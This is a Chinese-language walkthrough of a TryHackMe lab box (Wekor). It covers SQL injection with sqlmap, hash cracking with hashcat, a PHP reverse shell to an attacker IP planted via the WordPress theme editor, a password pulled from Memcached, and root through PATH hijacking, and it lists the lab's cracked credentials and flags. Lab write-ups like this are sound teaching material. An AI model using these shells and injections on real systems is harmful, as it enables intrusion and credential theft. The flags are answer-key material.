# THM Wekor 渗透测试 (2026-05-26)

**目标**: 10.49.177.129 - TryHackMe 靶场 (Wekor)
**授权**: THM 授权靶场，全 IP 范围，无限制

## 攻击链

1. **信息搜集**: Nmap 扫描发现 22/80 端口 (SSH/HTTP)
2. **Web 枚举**: robots.txt 泄露 9 个禁止目录
3. **隐藏路径**: /comingreallysoon/ 泄露 /it-next/ 路径
4. **SQL 注入**: it_cart.php coupon_code 参数存在 MySQL 注入
5. **数据库枚举**: sqlmap 读取 WordPress 用户密码 hash
6. **密码破解**: hashcat 破解 3/4 用户密码 (wp_jeffrey/rockyou, wp_yura/soccer13, wp_eagle/xxxxxx)
7. **WordPress 后台**: yura 账号登录，主题编辑器上传 webshell
8. **获取 shell**: www-data 权限
9. **横向移动**: Memcached 缓存泄露 Orka 密码 `OrkAiSC00L24/7$`
10. **提权**: sudo bitcoin → PATH 劫持 python → root

## 获取的 Flags

| Flag         | 位置                  | 内容                               |
| ------------ | --------------------- | ---------------------------------- |
| **user.txt** | `/home/Orka/user.txt` | `1a26a6d51c0172400add0e297608dec6` |
| **root.txt** | `/root/root.txt`      | `f4e788f87cc3afaecbaf0f0fe9ae6ad7` |

## 关键技术点

### 1. SQL 注入
```bash
burpsuite抓包请求，将请求copy to file
sqlmap -r 请求包文件

sqlmap -u "http://wekor.thm/it-next/it_cart.php" \
  --data="coupon_code=1&apply_coupon=Apply+Coupon" \
  -p coupon_code --batch --dbs
```

### 2. 密码破解
```bash
hashcat -m 400 /tmp/wp_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### 3. WordPress 主题编辑器 getshell
编辑主题文件插入 PHP 反向 shell，触发后获取 www-data 权限。

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/你的KaliIP/4444 0>&1'");
?>

#访问 http://site.wekor.thm/wordpress/wp-content/themes/twentytwenty/404.php
```

### 4. Memcached 信息泄露
```bash
telnet localhost 11211
stats cachedump 1 100
get password
# OrkAiSC00L24/7$
```

### 5. PATH 劫持提权
bitcoin 程序使用 `python`（相对路径）调用 transfer.py：
```bash
cat > /usr/sbin/python << 'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /usr/sbin/python
sudo /home/Orka/Desktop/bitcoin
# 密码: password
# 金额: 1
# 获取 root shell
```

## 权限提升路径

```
www-data (WordPress webshell) → Orka (Memcached 密码) → root (sudo PATH 劫持)
```

## 发现的凭证

| 服务      | 用户名     | 密码            | 来源              |
| --------- | ---------- | --------------- | ----------------- |
| WordPress | wp_jeffrey | rockyou         | hashcat 破解      |
| WordPress | wp_yura    | soccer13        | hashcat 破解      |
| WordPress | wp_eagle   | xxxxxx          | hashcat 破解      |
| 系统      | Orka       | OrkAiSC00L24/7$ | Memcached 缓存    |
| bitcoin   | -          | password        | 硬编码 (gdb 分析) |
